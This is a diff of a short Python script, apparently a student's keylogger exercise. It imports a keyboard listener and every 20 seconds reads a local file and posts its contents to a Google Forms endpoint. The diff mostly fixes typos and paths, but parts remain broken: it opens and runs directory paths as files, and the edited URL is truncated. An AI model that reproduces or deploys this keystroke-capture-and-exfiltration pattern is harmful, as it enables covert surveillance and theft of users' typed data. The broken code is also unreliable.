@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 
 import requests
 import time
@@ -7,19 +7,19 @@ from pynput.keyboard import Listener
 
 startlog = time.time()
 
-os.system("python3 /home/student/Desktop/scripts/")
+os.system("python3 /home/student/Desktop/scripts")
 time.sleep(1)
 
 def send_request():
-        form_input = open("/home/student/ITP270_001N_FALL2022")
+        form_input = open("/home/student/Desktop/scripts")
         form_send = form_input.read()
-        url= 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdiMHViuoPlW3UujN2b0M3xiT81aKGeEp779j46XlD58PzZ1A/formResponse'
+        url= 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdiMHViuoPlW3UujN2b0>
         form_data = {'entry.2005620554': f"'{form_send}'"}
         r = requests.post(url, data=form_data)
 
 def interval():
         global startlog
-        if time.tome() - 20 > startlog:
+        if time.time() - 20 > startlog:
                 print('Its been 20 secs')
                 send_request()
                 startlog = time.time()
